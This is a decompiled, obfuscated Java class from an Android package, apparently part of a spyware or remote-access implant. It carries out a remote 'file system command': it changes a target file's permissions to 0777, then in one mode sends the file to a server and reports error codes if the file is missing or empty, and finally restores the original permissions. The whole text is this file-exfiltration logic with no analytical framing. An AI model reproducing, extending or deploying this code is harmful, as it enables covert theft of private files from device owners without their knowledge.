package com.network.android;

import android.content.Context;
import com.network.android.c.a.a;
import com.network.android.c.a.b;
import com.network.i.e;
import java.io.File;
import java.util.HashMap;

/* access modifiers changed from: package-private */
public final class n implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ String f105a;
    final /* synthetic */ int b;
    final /* synthetic */ Context c;
    final /* synthetic */ String d;

    n(String str, int i, Context context, String str2) {
        this.f105a = str;
        this.b = i;
        this.c = context;
        this.d = str2;
    }

    public final void run() {
        try {
            HashMap b2 = m.b(this.f105a);
            m.b("0777", this.f105a);
            if (1 == this.b) {
                if (b2 == null) {
                    a.a("parseFileSystemCommand get chmod data failed. ");
                }
                Context context = this.c;
                String str = this.f105a;
                String str2 = this.d;
                try {
                    a.a("sendGetFileToServer starting. getting file: " + str);
                    String b3 = e.b();
                    File file = new File(str);
                    if (!file.exists()) {
                        a.a("sendGetFileToServer file does not exists. returning");
                        b.a(0, 119, "GET_FILE_FILE_DOES_NOT_EXISTS", com.network.h.b.c(str2));
                        b.a(0, -15534, "", com.network.h.b.c(str2));
                    } else if (((int) file.length()) == 0) {
                        a.a("sendGetFileToServer file size is 0");
                        b.a(0, 117, "GET_FILE_EMPTY_DIR_OR_FILE", com.network.h.b.c(str2));
                        b.a(0, -15534, "", com.network.h.b.c(str2));
                    } else {
                        b.a(str2);
                        com.network.i.b.a();
                        com.network.i.b.a(str, b3, 0, 1, str2);
                    }
                } catch (Throwable th) {
                    b.a(0, 116, "GET_FILE_GENERAL_FAILURE", com.network.h.b.c(str2));
                    b.a(0, -15534, "", com.network.h.b.c(str2));
                    a.a("sendGetFileToServer exception" + th.getMessage(), th);
                }
            } else {
                m.a(this.f105a, this.c, this.d);
            }
            m.a(b2, this.f105a);
        } catch (Throwable th2) {
            a.a("parseFileSystemCommand Send Data List Exception- " + th2.getMessage(), th2);
            b.a(1, (short) 24);
        }
    }
}
